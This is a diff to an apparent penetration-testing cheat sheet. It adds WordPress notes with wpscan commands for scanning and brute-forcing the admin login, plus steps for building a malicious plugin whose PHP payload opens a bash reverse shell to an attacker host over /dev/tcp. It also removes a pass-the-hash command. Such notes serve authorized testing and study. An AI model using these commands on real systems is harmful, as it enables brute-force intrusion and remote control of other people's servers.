@@ -145,6 +145,28 @@ Apache Tomcat
 IIS
 * IIS paths may be configured to be Case Sensitive. Take care when navigating / exploiting LFI/RFI or directory traversal.
 
+Wordpress wpscan
+```
+# normal scan
+wpscan --url [target]/wordpress
+
+# brute-force WP logins
+wpscan --url [target]/wordpress -U admin -P [/path/to/wordlist]
+```
+
+Wordpress reverse shell (https://github.com/wetw0rk/malicious-wordpress-plugin)
+```
+# STEP 1: Create malicious plugin
+$ python wordpwn.py [LHOST] [LPORT] N
+$ unzip malicious.zip
+
+# STEP 2: Replace generated base64-encoded PHP payload with
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[LHOPST]/[LPORT] 0>&1'"); ?>
+
+# STEP 3: Navigate to [target]/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php
+```
+
+
 ### POP3 [110 TCP]
 
 Post Office Protocol (ver 3) is an application layer protocol used to download emails from a remote server to your local device.
@@ -732,12 +754,3 @@ Hashcat
 $ hash-identifier [hash]    
 $ hashcat -m [hash-type] -a 0 [hash-file] [wordlist] -o cracked.txt
 ```
-
-
-### Pass The Hash
-
-Pass-the-Hash
-```
-$ pth-winexe -U [username]%[password_hash] //[target] [command_to_exec]
-```
-
